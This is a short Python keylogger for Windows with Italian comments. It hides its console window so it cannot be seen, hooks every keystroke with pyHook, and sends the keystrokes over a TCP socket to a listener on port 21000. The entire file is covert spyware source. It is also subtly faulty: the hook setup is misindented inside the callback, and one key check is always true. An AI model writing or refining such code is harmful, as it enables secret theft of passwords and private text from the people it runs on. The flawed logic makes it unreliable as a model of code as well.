# Importo le librerie per il keylogger

import win32api
import win32console
import win32gui
import pythoncom, pyHook

# Importo la libreria per il socket

import socket

# Nascondo la finestra della console in modo da nascondere il programma

win = win32console.GetConsoleWindow()
win32gui.ShowWindow(win, 0)

# Creo la socket e mi connetto al server

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.connect(("127.0.0.1", 21000))


# Funzione chiamata ad ogni pressione di un tasto

def OnKeyboardEvent(event):
    if event.Ascii == 5:
        exit(1)

    if event.Ascii != 0 or 8:
            keylogs = chr(event.Ascii)
            if event.Ascii == 13:
                keylogs = '\n'
            sock.send(keylogs)

    # Imposto pyhook in ascolto degli eventi della tastiera
    hm = pyHook.HookManager()
    hm.KeyDown = OnKeyboardEvent
    hm.HookKeyboard()
    pythoncom.PumpMessages()
